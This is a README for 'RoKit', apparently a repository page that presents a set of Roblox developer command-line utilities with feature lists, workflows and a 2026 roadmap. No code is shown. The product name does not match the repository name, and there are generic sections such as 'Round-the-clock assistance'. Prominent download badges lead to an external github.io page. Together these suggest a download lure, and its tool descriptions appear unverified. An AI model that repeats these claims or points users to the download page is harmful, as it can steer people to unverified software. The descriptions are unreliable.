![preview](https://raw.githubusercontent.com/Jinhwan-skku/scoop-roblox-workbench/main/cover_df49.svg)
[![Download](https://raw.githubusercontent.com/Jinhwan-skku/scoop-roblox-workbench/main/grab_b624c1.svg)](https://Jinhwan-skku.github.io/scoop-roblox-workbench/)

# 🧰 RoKit — The Roblox Developer’s Multitool

Welcome to **RoKit**, a thoughtfully curated collection of command-line sidekicks for people who build, ship, and maintain experiences on Roblox. Where `scoop-roblox` offered a straightforward way to pull in tooling via Scoop, RoKit goes a step further — it is less a bucket and more a *workshop bench*. Every utility here is chosen because it removes friction between an idea and a running place file, so you spend more of your day designing gameplay loops and less of it fighting your environment.

RoKit is designed for the solo scripter who lives in a terminal, the studio team that wants reproducible build machines, and the toolmaker who needs composable primitives they can chain together in CI. It assumes you are comfortable on the command line and rewards that comfort with speed.

[![Download](https://raw.githubusercontent.com/Jinhwan-skku/scoop-roblox-workbench/main/grab_b624c1.svg)](https://Jinhwan-skku.github.io/scoop-roblox-workbench/)

---

## 📜 Table of Contents

- [Why RoKit Exists](#-why-rokit-exists)
- [Feature Highlights](#-feature-highlights)
- [The Utility Suite](#-the-utility-suite)
- [Responsive and Accessible by Design](#-responsive-and-accessible-by-design)
- [Multilingual Support](#-multilingual-support)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Configuration Model](#-configuration-model)
- [Typical Workflows](#-typical-workflows)
- [Project Layout](#-project-layout)
- [Compatibility Matrix](#-compatibility-matrix)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🌱 Why RoKit Exists

Roblox development has a peculiar shape. You design in one window, you script in another, you publish from a third, and somewhere in between there are assets, model files, packages, and a build pipeline that nobody remembers configuring. The friction is rarely dramatic — it is a thousand tiny paper cuts. A tool that does not accept stdin. A helper that only runs on one operating system. A script that silently relies on a file being in the right folder.

RoKit is an answer to that paper-cut problem. Instead of one monolithic application, it is a family of small, sharp tools that each do one thing well and compose cleanly with the others. Pipe the output of the asset scanner into the dependency auditor. Feed the dependency report into the changelog generator. Hand the changelog to the release preparer. The chain is yours to design.

The project is deliberately opinionated about *ergonomics* and deliberately unopinionated about *your workflow*. It will never ask you to restructure your project to fit its expectations. It meets your repository where it already lives.

---

## ✨ Feature Highlights

- **Composable command set** — each utility reads from standard input and writes to standard output, so shell pipelines behave the way you expect them to.
- **Responsive terminal interface** — output adapts to narrow and wide terminals alike, wrapping gracefully instead of shredding your scrollback. Colour is opt-in and degrades to monochrome when the output is redirected.
- **Multilingual support** — user-facing messages ship in a bundle of languages, and the translation layer is open for community additions. English, Spanish, Portuguese (Brazil), German, French, Japanese, Korean, and Simplified Chinese are included out of the box.
- **Round-the-clock assistance** — an always-available help channel and an in-tool documentation command mean you are never stuck staring at a cryptic error alone.
- **Deterministic builds** — every utility that touches artifacts produces byte-stable output on repeated runs, which makes caching in continuous integration genuinely reliable.
- **Zero global mutation** — nothing writes outside the directories you point it at. No surprise registry edits, no hidden config pushed to your home folder unless you ask for it.
- **Cross-platform parity** — Linux, macOS, and Windows are all first-class targets, with the same flags, the same output, and the same exit codes.
- **Extensible plugin surface** — drop a plugin into the plugin directory and RoKit will discover, validate, and expose it alongside the built-ins.

---

## 🧭 The Utility Suite

RoKit is organised into a handful of commands, each named after the job it performs. The descriptions below are the *spirit* of each tool rather than a full flag reference; run any command with `--help` to see its complete option set.

### `rokit inspect`

The cartographer of your project. Point it at a directory and it walks the tree, cataloguing Luau sources, model files, asset references, and package manifests. Its default output is a human-readable summary; with `--format json` it emits a machine-readable graph you can feed to other tools.

Think of it as a surveyor who sketches the terrain before anyone starts building. You learn where the heavy files are, which modules nobody imports, and which asset identifiers appear in more than one place.

### `rokit audit`

The auditor reads the inventory produced by `inspect` and looks for things that will bite you later. Unreferenced assets. Version ranges that permit incompatible upgrades. Duplicate model definitions that have drifted apart. Sources that reference asset identifiers which no longer resolve.

It does not merely complain — it ranks findings by severity and explains, in plain language, why each one matters.

### `rokit sync`

The synchroniser reconciles a project’s declared dependencies with what is actually present. Where a package manager would rewrite a lockfile, `sync` produces a *plan* first and lets you review it. Apply the plan with a second invocation, or pipe it to a reviewer for approval.

The core idea is borrowed from infrastructure tooling: never mutate state without first showing what will change.

### `rokit pack`

The packer bundles a project into a distributable artifact. It honours ignore rules, normalises line endings, and records a manifest of every file it included along with a content hash. The resulting bundle is reproducible: the same inputs always produce the same archive, byte for byte.

### `rokit notes`

The changelog companion. Give it two points in history and it will generate a structured summary of what moved between them. It can group entries by category, link them to commit identifiers in your tracker, and render the result as Markdown, plain text, or a compact terminal digest.

### `rokit doctor`

The diagnostician. When something is wrong but you are not sure what, `doctor` runs a battery of environment checks — toolchain versions, path configuration, permission sanity, network reachability of asset endpoints — and prints a prioritised list of problems with suggested remedies.

### `rokit doc`

The librarian. It serves the built-in manual for any command, supports fuzzy matching on topic names, and can render output as a pager-friendly document. Every utility’s help text is drawn from the same source, so instruction and implementation never drift.

---

## 📱 Responsive and Accessible by Design

“Responsive” usually describes a web layout. RoKit borrows the idea and applies it to the terminal. Output is measured against the detected terminal width and reflows accordingly. Tables collapse into stacked key-value pairs on narrow screens. Progress indicators are suppressed entirely when stdout is not a TTY, so log files stay clean.

Accessibility matters here too:

- Colour is never the *only* signal. Severity is conveyed through words and symbols as well as hue.
- A `--no-color` flag and a `NO_COLOR` environment variable are both honoured.
- The `rokit doc` command prefers a pager when one is available, but falls back to plain streaming output.
- All interactive prompts have a non-interactive equivalent, so automation never gets stuck waiting for a keypress.

---

## 🌍 Multilingual Support

Localisation is handled through a message catalogue keyed by stable identifiers. Adding a language means adding one catalogue file — no code changes, no build system surgery. The project ships with the following catalogues maintained in-tree, and community contributions for additional languages are welcome:

- English
- Spanish
- Portuguese (Brazil)
- German
- French
- Japanese
- Korean
- Simplified Chinese

When a message is missing from a catalogue, RoKit falls back to English rather than printing a raw key. You will never see `error.audit.missing_asset` in your terminal — you will see a sentence, in your language if it exists, or a clear English sentence if it does not.

Set the language with the `ROKIT_LANG` environment variable or the `--lang` flag.

---

## 🕑 Round-the-Clock Assistance

Because development does not politely confine itself to business hours, RoKit pairs its offline documentation with an always-reachable support channel. Whether it is the middle of the night in one timezone or the start of a sprint in another, you can reach a maintainer or a fellow user. The in-tool `rokit doc` command means the most common questions are answered instantly, without a network round trip, while the community channel handles the ones that need a human.

Support channels are listed in the repository’s discussions area and are monitored by maintainers and long-time contributors alike.

---

## ⚙️ Configuration Model

RoKit reads configuration from three layers, in ascending order of precedence:

1. **Built-in defaults** — sensible, documented, and stable across minor releases.
2. **Project configuration** — a file at the root of your project, committed alongside your sources so every contributor shares the same behaviour.
3. **Environment and flags** — per-invocation overrides for machines with unusual layouts or for one-off experiments.

The key principle is *explicitness*: a behaviour that depends on configuration should be discoverable by reading the configuration, not by reading the source.

---

## 🔁 Typical Workflows

### Before opening a merge request

Run `inspect`, then `audit`, then `notes` against your branch point. The first tells you what is there, the second tells you what is risky, and the third drafts the description of what changed. Paste the result into your review request and spare your reviewers the archaeology.

### Preparing a release

Run `sync` to reconcile dependencies, review the plan, apply it, then `pack` to produce the distributable. Record the bundle manifest alongside the release so anyone can verify later that the artifact matches the sources it claims to come from.

### Onboarding a new machine

Run `doctor` first. It will tell you what is missing before you waste an hour discovering it yourself through cryptic failures. Then run `inspect` on the project you intend to work on, to confirm the toolchain sees everything you expect.

### In continuous integration

Chain the tools in a single pipeline: `inspect` for an inventory artifact, `audit` as a gate that fails the build on high-severity findings, `pack` to produce the release bundle. Because every step is deterministic, caching between runs is safe and effective.

---

## 🗂 Project Layout

The repository is organised so that each utility lives in its own directory with its own tests, and shared code sits in a common layer that all of them draw from.

- A directory per command, each containing the command entry point and its focused test suite.
- A shared library layer for terminal rendering, configuration loading, and localisation.
- A catalogue directory holding one file per supported language.
- A plugin directory where third-party extensions are discovered at runtime.
- A documentation directory containing the sources for `rokit doc` and the long-form guides.

This separation keeps the blast radius of any change small and makes it straightforward to reason about what a given release touched.

---

## 🧮 Compatibility Matrix

RoKit targets the three major desktop platforms with equivalent behaviour:

- **Linux** — tested against recent long-term-support distributions on both x86-64 and ARM64.
- **macOS** — tested on both Apple silicon and Intel hardware.
- **Windows** — tested on Windows 10 and Windows 11, in both native and WSL environments.

Package-manager integrations are provided for the platforms that have a clear convention, and a portable archive is produced for every release so that no environment is left out.

---

## 🛣 Roadmap for 2026

- **Structured audit output for editors** — expose findings in a format that editors can consume directly, so problems surface inline rather than in a separate terminal.
- **Catalogue expansion** — add Italian, Dutch, and Polish, with community review for each.
- **Plugin signing** — allow plugin authors to sign their extensions so consumers can verify provenance before running them.
- **Incremental packing** — pack only the parts of a project that changed since a given reference, for very large experiences.
- **Bidirectional sync plans** — allow a reviewed plan to be applied or reversed, so experiments are cheap to undo.
- **Performance budgets** — let a project declare ceilings for inventory size and audit time, and fail the build when they are exceeded.

---

## 🤝 Contributing

Contributions are welcome and appreciated. Before opening a pull request, please read the contributing guide, which covers the code style, the test expectations, and the process for proposing a new utility. Good first issues are labelled in the tracker, and documentation improvements are valued just as highly as code.

If you are adding a language catalogue, please include a note about who will maintain it going forward — a translation with a caretaker is worth more than a translation without one.

---

## 📄 License

RoKit is released under the MIT License. You can read the full text in the [LICENSE](./LICENSE) file. In short: use it, adapt it, and share it, provided the copyright notice and permission notice travel with it.

---

## ⚠️ Disclaimer

RoKit is an independent developer tool. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation or any of its subsidiaries. “Roblox” and related marks are the property of their respective owners and are referenced here only to describe the platform this tooling is designed to support.

The utilities in this project operate on files and directories you explicitly point them at. They do not modify remote state, publish content, or interact with any account on your behalf. You are responsible for reviewing the output of any command before acting on it, and for backing up your work before running tools that write to disk.

As of 2026, the project is maintained by volunteers on a best-effort basis. There is no warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or the use of the software.

Always review third-party tooling before running it against a production project, and prefer reviewing a plan over applying a change blindly.

[![Download](https://raw.githubusercontent.com/Jinhwan-skku/scoop-roblox-workbench/main/grab_b624c1.svg)](https://Jinhwan-skku.github.io/scoop-roblox-workbench/)